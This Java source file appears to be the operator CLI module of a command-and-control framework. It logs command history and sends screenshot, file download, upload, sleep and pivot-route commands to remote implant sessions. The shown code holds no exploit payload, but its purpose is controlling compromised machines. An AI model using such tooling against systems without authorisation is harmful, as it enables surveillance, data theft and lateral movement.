package com.raven.interfaces.CLI.module.task;

import com.raven.core.database.TeamDatabase;
import com.raven.core.output.Logger;
import com.raven.interfaces.CLI.module.session.SessionCommands;
import com.raven.interfaces.CLI.module.terminal.TerminalRenderer;
import com.raven.utils.AnsiColor;
import java.util.List;
import java.util.Map;

public final class TaskCommands {

    private final TeamDatabase     Database;
    private final TerminalRenderer Renderer;
    private final SessionCommands  SessionCommands;

    private String OperatorName;

    public TaskCommands(TeamDatabase Database, TerminalRenderer Renderer, SessionCommands SessionCommands) {
        this.Database        = Database;
        this.Renderer        = Renderer;
        this.SessionCommands = SessionCommands;
    }

    public void SetOperator(String OperatorName) {
        this.OperatorName = OperatorName;
    }

    public void ShowCommandHistory(int SessionId, int Limit) {
        List<Map<String, Object>> History = Database.GetCommandHistory(SessionId, Limit);
        String Title = SessionId == 0
            ? "COMMAND HISTORY (all sessions, last " + Limit + ")"
            : "COMMAND HISTORY - session-" + SessionId + " (last " + Limit + ")";
        System.out.println(Renderer.Box(Title));
        System.out.println();
        if (History.isEmpty()) { Logger.Info("No command history\n"); return; }

        Logger.Custom("  %s%-5s %-12s %-14s %-36s %s%s%n",
            AnsiColor.Red, "SID", "OPERATOR", "STATUS", "COMMAND", "TIMESTAMP", AnsiColor.Reset);
        System.out.println(Renderer.Divider());

        for (Map<String, Object> Record : History) {
            boolean Success = Boolean.parseBoolean(Record.getOrDefault("Success", "false").toString());
            String  Command = Record.getOrDefault("Command", "").toString();
            if (Command.length() > 36) Command = Command.substring(0, 35) + "…";
            Logger.Custom("  %s%-5s %-12s %s%-14s%s %-36s %s%s%n",
                AnsiColor.White,
                Record.getOrDefault("AgentId", "?"),
                Record.getOrDefault("Operator", "?"),
                Success ? AnsiColor.Green : AnsiColor.Red,
                Success ? "ok" : "fail",
                AnsiColor.White,
                Command,
                Record.getOrDefault("Timestamp", ""),
                AnsiColor.Reset);
        }
        System.out.println();
    }

    public void SetNote(int SessionId, String NoteText) {
        Database.SetAgentNote(SessionId, NoteText);
        Logger.Info("note saved for session-" + SessionId);
    }

    public void GetNote(int SessionId) {
        String Note = Database.GetAgentNote(SessionId);
        Logger.Custom("  Note [session-%d]: %s%s%s%n",
            SessionId, AnsiColor.White, Note.isEmpty() ? "(empty)" : Note, AnsiColor.Reset);
    }

    public void Screenshot(int SessionId) {
        SessionCommands.Execute(SessionId, "screenshot");
    }

    public void Download(int SessionId, String RemotePath) {
        SessionCommands.Execute(SessionId, "download " + RemotePath);
    }

    public void Upload(int SessionId, String LocalPath, String RemotePath) {
        SessionCommands.Execute(SessionId, "upload " + LocalPath + " " + RemotePath);
    }

    public void Sleep(int SessionId, String Seconds) {
        SessionCommands.Execute(SessionId, "sleep " + Seconds);
    }

    public void RegisterPivot(int SessionId, String Target) {
        if (!Target.contains(":")) {
            Logger.Error("invalid format - use host:port (e.g. 192.168.1.10:4445)");
            return;
        }
        String PivotHost;
        int    PivotPort;
        try {
            PivotHost = Target.split(":")[0];
            PivotPort = Integer.parseInt(Target.split(":")[1]);
        } catch (NumberFormatException Exception) {
            Logger.Warn("invalid port");
            return;
        }
        String PivotNote = "[PIVOT] " + Target;
        Database.SetAgentNote(SessionId, PivotNote);
        Database.SaveCommandLog(SessionId,
            OperatorName != null ? OperatorName : "cli",
            "pivot " + Target, "Pivot route set: " + Target, true);
        Logger.Custom("  %sPivot route registered: session-%d > %s%s%n",
            AnsiColor.Green, SessionId, Target, AnsiColor.Reset);
        Logger.Custom("  %s  Use your agent to initiate connection to %s:%d%s%n",
            AnsiColor.White, PivotHost, PivotPort, AnsiColor.Reset);
    }

    public static int ParseIntSafe(String Value, int Default) {
        try {
            return Integer.parseInt(Value.trim());
        } catch (Exception Exception) {
            return Default;
        }
    }
}
